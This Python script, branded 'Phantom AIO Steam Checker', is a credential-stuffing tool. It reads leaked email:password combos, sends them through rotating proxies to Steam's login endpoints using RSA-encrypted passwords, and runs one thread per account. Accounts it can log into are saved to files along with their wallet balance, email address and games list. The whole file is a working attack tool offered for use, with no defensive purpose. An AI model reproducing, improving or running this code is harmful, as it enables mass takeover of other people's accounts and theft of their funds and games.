import os, sys, json, time, random, string, ctypes, concurrent.futures
import requests
import colorama
import pystyle
import uuid
import functools
import datetime
import threading
from colorama import Fore, Style
from random import choice
from json import dumps
from pystyle import System, Colors, Colorate, Write
from concurrent import futures
from uuid import uuid4
from requests import Session
from time import time as t
from base64 import b64encode
from urllib.parse import quote
from json import loads
from rsa import encrypt, PublicKey

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

invalid = 0
valid = 0
custom = 0
premium = 0
proxy_error = 0
accounts_processed = 0
print()
start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Steam Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, custom, premium, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Steam Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error} | CPM : {cpm}')

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def steam_checker(email, password):
    global invalid, valid, proxy_error, accounts_processed, custom
    try:
        proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
                 if len(open("./proxies.txt", "r").readlines()) != 0
                 else None)

        session = Session()

        if ":" in proxy and len(proxy.split(":")) == 4:
            ip, port, user, pw = proxy.split(":")
            proxy_string = f"http://{user}:{pw}@{ip}:{port}"
        else:
            ip, port = proxy.split(":")
            proxy_string = f"http://{ip}:{port}"

        session.proxies = {
            "http": proxy_string,
            "https": proxy_string
        }

        username = email.split("@")[0] if "@" in email else email
        email = email if "@" in email else "-"
        temp_time = int(t())
        data = f"donotcache={temp_time}&username={username}"
        headers = {
            "Accept": "*/*" ,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" ,
            "Origin": "https://steamcommunity.com" ,
            "X-Requested-With": "XMLHttpRequest" ,
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" ,
            "Accept-Encoding": "gzip, deflate, br" ,
            "Accept-Language": "en-us" ,
        }

        response = session.post("https://steamcommunity.com/login/getrsakey/", headers=headers, data=data)
        if "success\":true" not in response.text:
            raise

        keys = response.json()
        k1 = keys["publickey_mod"]
        k2 = keys["publickey_exp"]
        t_2 = keys["timestamp"]

        encrypted_password = quote(b64encode(encrypt(password.encode(),PublicKey(int(k1,16), int(k2,16)))))
        
        def get_genned_numbers(char):
            chars = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            return "".join(random.choices(chars,k=char))
        
        data2 = f"donotcache={temp_time}&password={encrypted_password}&username={username}&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={t_2}&remember_login=false&oauth_client_id={get_genned_numbers(8).upper()}"
        headers2 = {
            "Accept":"*/*" ,
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8" ,
            "Origin":"https://steamcommunity.com" ,
            "X-Requested-With":"XMLHttpRequest" ,
            "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" ,
            "Referer":"https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client" ,
            "Accept-Encoding":"gzip, deflate, br" ,
            "Accept-Language":"en-us" ,
        }
        response2 = session.post("https://steamcommunity.com/login/dologin/", data=data2, headers=headers2)
        if "\"The account name or password that you have entered is incorrect.\"," in response2.text:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {username}{gray}:{pink}{password}{gray}")
            invalid += 1
            accounts_processed += 1
            update_console_title()
            return
        elif "\",\"emailauth_needed\":true," in response.text:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {username}{gray}:{pink}{password}{gray}")
            folder = "Checked/Steam"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open("Checked/Steam/steam_custom", "a+", encoding='utf-8') as save:
                save.write(f"{username}:{password} | Email : {email} | Email Auth : True")
            custom += 1
            accounts_processed += 1
            update_console_title()
            return
        elif "\"success\":true," not in response.text:
            raise

        cookie = response.cookies["steamLoginSecure"]
        steam_id = response.json()["transfer_parameters"]["steamid"]
        headers3 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        game_check = session.get(f"https://steamcommunity.com/profiles/{steam_id}/games/?tab=all", headers=headers3)
        if 'Your profile is being forced private due to an active Community Ban on your account.' in game_check.text:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {username}{gray}:{pink}{password}{gray}")
            folder = "Checked/Steam"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open("Checked/Steam/steam_custom", "a+", encoding='utf-8') as save:
                save.write(f"{username}:{password} | Email : {email} | Email Auth : True")
            custom += 1
            accounts_processed += 1
            update_console_title()
            return
        
        games = []
        games_list = loads(game_check.text.replace("&quot;",'"').split("rgGames\":")[1].split(",\"rg")[0])
        for game in games_list:
            games.append(game["name"])

        check_store = session.get("https://store.steampowered.com/account/",headers=headers3, cookies={
            "steamLoginSecure": cookie
            }
        )
        balance = check_store.text.split('<div class="accountData price">')[1].split("</div>")[0]
        email = check_store.text.split('Email address:</span> <span class="account_data_field">')[1].split('</span>')[0]
        time_rn = get_time_rn()
        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {username}{gray}:{pink}{password}")
        folder = "Checked/Steam"
        if not os.path.exists(folder):
            os.makedirs(folder)
        with open("Checked/Steam/steam_good", "a+", encoding='utf-8') as save:
            save.write(f"{username}:{password} | Email : {email} | Email Auth : False | Balance : {balance} | Total Games : {len(games)} | Games : [{', '.join(games)}]")
        valid += 1
        accounts_processed += 1
        update_console_title()
        return
    except:
        proxy_error += 1
        update_console_title()
        steam_checker(email, password)

accounts = []

with open('combos.txt', 'r', errors='ignore') as file:
    for line in file:
        if ':' in line:
            email, password = line.rsplit(':', 1)
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    steam_checker(email, password)

def start_threads():
    threads = []
    for email, password in accounts:
        thread = threading.Thread(target=process_account, args=(email, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

max_threads = 500

start_threads()